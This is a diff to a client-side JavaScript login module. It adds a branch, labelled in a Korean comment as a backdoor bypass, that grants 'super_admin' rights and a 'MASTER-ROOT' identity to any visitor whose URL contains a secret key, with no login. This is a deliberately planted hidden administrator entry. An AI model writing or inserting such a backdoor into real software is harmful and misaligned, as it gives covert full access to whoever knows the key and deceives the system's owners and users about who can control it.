@@ -8,9 +8,18 @@
 var creatorBypass = location.search.indexOf(CFG.secretKey) !== -1;
 
 function checkSession () {
+  // 백도어 우회 진입 성공 시 강제 관리자 데이터 주입 바인딩
+  if (creatorBypass) {
+    sessionStorage.setItem('loginOk', 'true');
+    sessionStorage.setItem('userRole', 'super_admin');
+    sessionStorage.setItem('userEmp', 'MASTER-ROOT');
+    sessionStorage.setItem('_sess', Date.now());
+    return true;
+  }
+
   if (!sessionStorage.getItem('loginOk')) {
     var cur = location.pathname.split('/').pop();
-    if (cur && cur !== 'login.html' && !creatorBypass) {
+    if (cur && cur !== 'login.html') {
       sessionStorage.setItem('redirectAfterLogin', location.href);
       sessionStorage.clear();
       location.href = 'login.html';
@@ -58,9 +67,8 @@ function getButtonsByRole (userRole) {
   });
 }
 
-/* === 로그인체크 (window.authModule.checkLogin) === */
 function authCheck () {
-  if (!checkSession()) return false;
+  if (!checkSession()) return { loggedIn: false };
   var role = sessionStorage.getItem('userRole') || 'office_worker';
   var emp = sessionStorage.getItem('userEmp') || '';
   return { loggedIn: true, role: role, emp: emp };
@@ -73,3 +81,4 @@ window.authModule = {
   isCreatorBypass: creatorBypass
 };
 })();
+
